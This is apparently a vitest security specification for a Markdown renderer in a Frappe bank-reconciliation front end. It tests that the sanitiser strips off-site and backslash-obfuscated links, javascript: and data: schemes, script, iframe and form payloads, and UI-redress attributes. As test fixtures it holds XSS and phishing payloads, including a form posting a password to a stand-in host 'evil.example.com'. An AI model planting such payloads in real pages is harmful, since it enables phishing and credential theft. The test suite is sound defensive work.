/**
 * Security specification for the shared `MarkdownRenderer`.
 *
 * This component is the ONE place this application turns text it does not control into DOM. Two
 * families of caller reach it, and both carry attacker-influenced data:
 *
 *   1. the five list/report intro sentences, which interpolate a RECORD NAME into a translated
 *      sentence as raw `<strong>…</strong>` (`BankTransactionList`, `BankClearanceSummary`,
 *      `BankReconciliationStatement`, `IncorrectlyClearedEntries`, `RecordPaymentModalContent`),
 *      and the link-search result descriptions in `LinkFieldCombobox`;
 *   2. `ErrorBanner` - and through it the dismissible `BankRecErrorDialog` - which renders every
 *      entry of Frappe's `_server_messages` envelope verbatim.
 *
 * `rehypeRaw` is registered on this renderer, so raw HTML inside that text becomes real nodes.
 * Without a sanitiser a bank account named `[Sign in](https://evil.example.com/login)` renders a
 * LIVE, camouflaged off-site anchor inside an authenticated page, and Frappe's own `sanitize_html`
 * does not help: it KEEPS absolute off-site anchors in `_server_messages`, merely adding `rel`.
 *
 * The specification below is the boundary itself, asserted on the rendered DOM rather than on the
 * predicate, because the DOM is what a reader can click:
 *
 *   - no element rendered from untrusted text may name a host other than this one;
 *   - a destination that is refused loses its ANCHOR but keeps its TEXT, so nothing the server
 *     wrote is ever hidden from the reader;
 *   - destinations that point back at this application still render, with `rel` stamped, so the
 *     hardening cannot quietly degrade into "no link ever survives";
 *   - script, style, frame, media and form-control payloads never reach the document at all;
 *   - `style`, every `on*` handler, and the two UI-redress primitives `class` and `id` are stripped.
 */

import { render } from '@testing-library/react'
import { describe, expect, it } from 'vitest'

import MarkdownRenderer from './markdown'

/**
 * The host every hostile payload below resolves to. Asserted through the platform URL parser
 * FIRST, so each payload is demonstrably hostile in this environment rather than only in theory.
 */
const HOSTILE_HOST = 'evil.example.com'

type LinkProbe = {
    readonly label: string,
    readonly href: string,
    readonly text: string,
}

/**
 * Every off-site spelling the sanitiser must refuse. The three backslash forms are the ones a
 * purely syntactic test misses: WHATWG URL parsing - what every browser and jsdom implement -
 * folds `\` into `/` inside an http(s) URL, so each resolves to another origin while carrying
 * neither a scheme nor a leading `//`.
 */
const OFF_SITE_DESTINATIONS: readonly LinkProbe[] = [
    { label: 'an absolute URL', href: 'https://evil.example.com/login', text: 'Sign in' },
    { label: 'the scheme-relative form', href: '//evil.example.com/login', text: 'Continue' },
    { label: 'two leading backslashes', href: '\\\\evil.example.com/login', text: 'Proceed' },
    { label: 'a slash then a backslash', href: '/\\evil.example.com/login', text: 'Verify' },
    { label: 'a backslash then a slash', href: '\\/evil.example.com/login', text: 'Confirm' }
]

/**
 * Destinations that resolve to THIS origin - so a bare origin comparison would admit every one of
 * them - and that the renderer refuses anyway. They pin the three refusals kept deliberately
 * stricter than origin equality: a backslash makes the destination the reader sees and the one the
 * browser computes disagree; a scheme-relative URL reads as off-site whoever it names; and refusing
 * every explicit scheme is what keeps `javascript:` out of a document whose own origin is opaque,
 * where both origins stringify to "null".
 *
 * Built from `window.location` rather than hard-coded, so they stay this document's own host
 * whatever the harness serves the tests from.
 */
const STRICTLY_REFUSED_DESTINATIONS: readonly LinkProbe[] = [
    {
        label: 'a backslash inside an otherwise local path',
        href: '/app/bank-transaction\\ACC-BTN-2026-00001',
        text: 'Backslash path'
    },
    {
        label: 'the scheme-relative form naming this very host',
        href: `//${window.location.host}/app/bank-transaction/ACC-BTN-2026-00001`,
        text: 'Scheme-relative to us'
    },
    {
        label: 'an absolute URL naming this very origin',
        href: `${window.location.origin}/app/bank-transaction/ACC-BTN-2026-00001`,
        text: 'Absolute to us'
    }
]

/** Every dangerous scheme, which must never reach an `href`. */
const DANGEROUS_SCHEMES: readonly LinkProbe[] = [
    { label: 'javascript:', href: 'javascript:alert(1)', text: 'Run it' },
    { label: 'a control-character-obfuscated scheme', href: 'java\nscript:alert(1)', text: 'Sneak it' },
    { label: 'data:', href: 'data:text/html,<script>alert(1)</script>', text: 'Open it' },
    { label: 'vbscript:', href: 'vbscript:msgbox(1)', text: 'Execute it' }
]

/**
 * Destinations that point back at this application and must therefore STILL render - including the
 * root-relative `/app/…` document links Frappe's own server messages carry, and the `/desk/…` links
 * this application's own sentences use.
 */
const SAME_ORIGIN_DESTINATIONS: readonly string[] = [
    '#reconciliation',
    '/app/bank-transaction/ACC-BTN-2026-00001',
    '/desk/payment-entry/ACC-PAY-2026-00001',
    'app/bank-transaction/ACC-BTN-2026-00001',
    '?bank_transaction=ACC-BTN-2026-00001'
]

/** A single anchor written as raw HTML, which is the shape `_server_messages` arrive in. */
const rawAnchor = (href: string, text: string): string =>
    `Next step: <a href="${href}">${text}</a>`

const renderMarkdown = (content: string): HTMLElement => {
    const { container } = render(<MarkdownRenderer content={content} />)
    return container
}

/**
 * Sweeps the WHOLE document, not just the render container: a node escaping into a portal root
 * would otherwise pass unnoticed.
 */
const expectNothingNamesTheHostileHost = () => {
    document.querySelectorAll('[href], [src], [action], [data-href]').forEach((element) => {
        for (const attribute of Array.from(element.attributes)) {
            expect(attribute.value).not.toContain(HOSTILE_HOST)
        }
    })
}

describe('MarkdownRenderer', () => {

    describe('ordinary content is untouched', () => {

        it('renders the inline emphasis the application\'s own sentences rely on', () => {
            // Every intro sentence in the app interpolates its record name exactly like this.
            const container = renderMarkdown(
                'Below is a list of all bank transactions for <strong>HDFC Current Account</strong> between <strong>2026-08-01</strong> and <strong>2026-08-31</strong>.'
            )

            expect(container.querySelectorAll('strong')).toHaveLength(3)
            expect(container.textContent).toContain('HDFC Current Account')
            expect(container.textContent).not.toContain('<strong>')
        })

        it('keeps the other inline tags Frappe\'s own messages use', () => {
            const container = renderMarkdown('Currency <b>USD</b> differs.<br />Refresh and retry.')

            expect(container.querySelector('b')).not.toBeNull()
            expect(container.querySelector('br')).not.toBeNull()
            expect(container.textContent).toContain('Currency USD differs.')
        })

        it('renders ordinary markdown - lists, tables, code and emphasis', () => {
            const container = renderMarkdown(
                '# Heading\n\n- one\n- two\n\n| a | b |\n| - | - |\n| 1 | 2 |\n\n`code` and *emphasis*'
            )

            expect(container.querySelector('h1')).not.toBeNull()
            expect(container.querySelectorAll('li')).toHaveLength(2)
            expect(container.querySelector('table')).not.toBeNull()
            expect(container.querySelectorAll('td')).toHaveLength(2)
            expect(container.querySelector('code')).not.toBeNull()
            expect(container.querySelector('em')).not.toBeNull()
        })
    })

    describe('a destination is renderable only when it points back at this application', () => {

        /*
         * The CHARACTERS the server wrote are not the destination - the browser canonicalises them
         * first. Asserted through jsdom's own URL parser, the same one the predicate resolves with,
         * so every payload below is provably hostile here rather than presumed to be.
         */
        it.each(OFF_SITE_DESTINATIONS)(
            'resolves $label to another origin, which is what makes it hostile',
            ({ href }) => {
                const resolved = new URL(href, window.location.href)

                expect(resolved.host).toBe(HOSTILE_HOST)
                expect(resolved.origin).not.toBe(window.location.origin)
            }
        )

        it.each(OFF_SITE_DESTINATIONS)('renders no anchor for $label', ({ href, text }) => {
            const container = renderMarkdown(rawAnchor(href, text))

            // No anchor at all - not an href-less one, and not one pointing anywhere.
            expect(container.querySelectorAll('a')).toHaveLength(0)
            expectNothingNamesTheHostileHost()
            // The sentence survives intact, so nothing the server wrote is hidden.
            expect(container.textContent).toContain('Next step:')
            expect(container.textContent).toContain(text)
        })

        it('refuses the markdown link syntax an attacker-named record produces', () => {
            /*
             * This is the exact injection route through the intro sentences: a Bank Account whose
             * `account_name` is markdown link syntax. Frappe blocks `<` and `>` in names, but
             * `[text](url)` contains neither, so it passes name validation and arrives here wrapped
             * in the sentence's own `<strong>`.
             */
            const container = renderMarkdown(
                'Below is a list of all bank transactions for <strong>[Sign in to verify your account](https://evil.example.com/login)</strong> between <strong>2026-08-01</strong> and <strong>2026-08-31</strong>.'
            )

            expect(container.querySelectorAll('a')).toHaveLength(0)
            expectNothingNamesTheHostileHost()
            // The reader still sees the whole payload, as inert text.
            expect(container.textContent).toContain('Sign in to verify your account')
            // The legitimate emphasis around the dates is untouched.
            expect(container.querySelectorAll('strong')).toHaveLength(3)
        })

        it.each(STRICTLY_REFUSED_DESTINATIONS)(
            'refuses $label even though it resolves to this very origin',
            ({ href, text }) => {
                // Proves the refusal is deliberate rather than a side effect of the origin check.
                expect(new URL(href, window.location.href).origin).toBe(window.location.origin)

                const container = renderMarkdown(rawAnchor(href, text))

                expect(container.querySelectorAll('a')).toHaveLength(0)
                expect(container.textContent).toContain(text)
            }
        )

        it.each(DANGEROUS_SCHEMES)('refuses $label', ({ href, text }) => {
            const container = renderMarkdown(rawAnchor(href, text))

            expect(container.querySelectorAll('a')).toHaveLength(0)
            expect(container.innerHTML).not.toContain('javascript:')
            expect(container.innerHTML).not.toContain('vbscript:')
            expect(container.innerHTML).not.toContain('data:text/html')
            expect(container.textContent).toContain(text)
        })

        it.each(['', '////', '   '])(
            'refuses the empty or unparseable destination %j rather than throwing out of the sanitiser',
            (href) => {
                // `////` is a network path with an empty host: the parser THROWS on it, and that has to
                // be refused here rather than allowed to take down the dialog reporting a failure.
                const container = renderMarkdown(rawAnchor(href, 'Somewhere'))

                expect(container.querySelectorAll('a')).toHaveLength(0)
                expect(container.textContent).toContain('Somewhere')
            }
        )

        it.each(SAME_ORIGIN_DESTINATIONS)(
            'still renders %s, because it points back at this application',
            (href) => {
                const container = renderMarkdown(rawAnchor(href, 'Open the record'))
                const anchor = container.querySelector('a')

                expect(anchor).not.toBeNull()
                expect(anchor).toHaveAttribute('href', href)
                // Stamped even though a same-origin link cannot leak to a third party, so the
                // guarantee lives in this function rather than resting on the allow-list.
                expect(anchor).toHaveAttribute('rel', 'noreferrer noopener')
                // `target` is not on the allow-list, so a surviving link always opens in this tab.
                expect(anchor).not.toHaveAttribute('target')
            }
        )

        it('drops a target the server asked for on a surviving link', () => {
            const container = renderMarkdown(
                '<a href="/app/bank-transaction/ACC-BTN-2026-00001" target="_blank">Open</a>'
            )
            const anchor = container.querySelector('a')

            expect(anchor).not.toBeNull()
            expect(anchor).not.toHaveAttribute('target')
        })

        it('keeps every surviving anchor same-origin in a MIXED payload', () => {
            const container = renderMarkdown(
                [
                    rawAnchor('https://evil.example.com/login', 'Phish'),
                    rawAnchor('/app/bank-transaction/ACC-BTN-2026-00001', 'Legitimate'),
                    rawAnchor('\\\\evil.example.com/login', 'Backslash phish')
                ].join(' ')
            )

            const anchors = Array.from(container.querySelectorAll('a'))

            // Non-vacuous: exactly the one legitimate link survives, and it resolves to this origin.
            expect(anchors).toHaveLength(1)
            anchors.forEach((anchor) => {
                expect(new URL(anchor.getAttribute('href') ?? '', window.location.href).origin)
                    .toBe(window.location.origin)
            })
            expectNothingNamesTheHostileHost()
            expect(container.textContent).toContain('Phish')
            expect(container.textContent).toContain('Backslash phish')
        })
    })

    describe('active and redress payloads never reach the document', () => {

        it('drops a script subtree along with its contents', () => {
            const container = renderMarkdown(
                'Refused. <script>window.__pwned = true</script>Continue.'
            )

            expect(container.querySelector('script')).toBeNull()
            // The script BODY is discarded too - it is code, not text a reader should see.
            expect(container.textContent).not.toContain('__pwned')
            expect(container.textContent).toContain('Refused.')
            expect(container.textContent).toContain('Continue.')
            expect((window as unknown as Record<string, unknown>).__pwned).toBeUndefined()
        })

        it.each([
            ['style', '<style>body{display:none}</style>'],
            ['iframe', '<iframe src="https://evil.example.com/"></iframe>'],
            ['object', '<object data="https://evil.example.com/x.swf"></object>'],
            ['embed', '<embed src="https://evil.example.com/x" />'],
            ['svg', '<svg><use href="https://evil.example.com/x" /></svg>'],
            ['form', '<form action="https://evil.example.com/collect"><input name="pwd" /></form>'],
            ['input', '<input id="steal" type="password" name="password" />'],
            ['button', '<button onclick="window.__pwned=true">Go</button>'],
            ['textarea', '<textarea>hi</textarea>'],
            ['select', '<select><option>one</option></select>'],
            ['video', '<video src="https://evil.example.com/x.mp4"></video>'],
            ['audio', '<audio src="https://evil.example.com/x.mp3"></audio>'],
            ['img', '<img src="https://evil.example.com/beacon.gif" alt="x" />'],
            ['meta', '<meta http-equiv="refresh" content="0;url=https://evil.example.com/" />'],
            ['link', '<link rel="stylesheet" href="https://evil.example.com/x.css" />']
        ])('drops a %s payload entirely', (tagName, payload) => {
            const container = renderMarkdown(`Refused. ${payload} Continue.`)

            expect(container.querySelector(tagName)).toBeNull()
            expectNothingNamesTheHostileHost()
            // The surrounding sentence is never collateral damage.
            expect(container.textContent).toContain('Refused.')
            expect(container.textContent).toContain('Continue.')
        })

        it('strips every event handler while keeping the element and its text', () => {
            const container = renderMarkdown(
                '<p onmouseover="window.__pwned=true" onclick="window.__pwned=true">Hover me</p>'
            )
            const paragraph = container.querySelector('p')

            expect(paragraph).not.toBeNull()
            expect(paragraph).not.toHaveAttribute('onmouseover')
            expect(paragraph).not.toHaveAttribute('onclick')
            expect(paragraph?.textContent).toBe('Hover me')
        })

        it('strips `style`, `class` and `id`, which are the UI-redress primitives here', () => {
            /*
             * Tailwind compiles this application's utilities into the shipped stylesheet, so one
             * server-controlled `class` is enough to paint a full-viewport opaque overlay on top of
             * the very dialog reporting the failure. `id` is stripped alongside it because a
             * duplicated `id` steals an existing `aria-describedby`/`<label for>` target.
             */
            const container = renderMarkdown(
                '<div class="fixed inset-0 z-50 bg-surface-white" id="dialog-description" style="position:fixed;inset:0">Covered</div>'
            )
            const div = container.querySelector('div')

            expect(div).not.toBeNull()
            expect(div).not.toHaveAttribute('class')
            expect(div).not.toHaveAttribute('id')
            expect(div).not.toHaveAttribute('style')
            expect(div?.textContent).toBe('Covered')
        })

        it('keeps the text of an unknown tag and drops only the wrapper', () => {
            const container = renderMarkdown('<marquee>Scrolling</marquee><custom-tag>Kept</custom-tag>')

            expect(container.querySelector('custom-tag')).toBeNull()
            // `marquee` is a dropped SUBTREE, so its text goes with it.
            expect(container.textContent).not.toContain('Scrolling')
            // An unknown-but-harmless tag is unwrapped instead, so its text survives.
            expect(container.textContent).toContain('Kept')
        })

        it('discards HTML comments', () => {
            const container = renderMarkdown('Visible<!-- hidden note -->text')

            expect(container.innerHTML).not.toContain('hidden note')
            expect(container.textContent).toContain('Visible')
        })

        it('keeps the permitted table attributes it does allow', () => {
            const container = renderMarkdown(
                '<table><thead><tr><th scope="col" colspan="2">Head</th></tr></thead><tbody><tr><td colspan="2">Body</td></tr></tbody></table>'
            )

            expect(container.querySelector('th')).toHaveAttribute('scope', 'col')
            expect(container.querySelector('th')).toHaveAttribute('colspan', '2')
            expect(container.querySelector('td')).toHaveAttribute('colspan', '2')
        })
    })
})
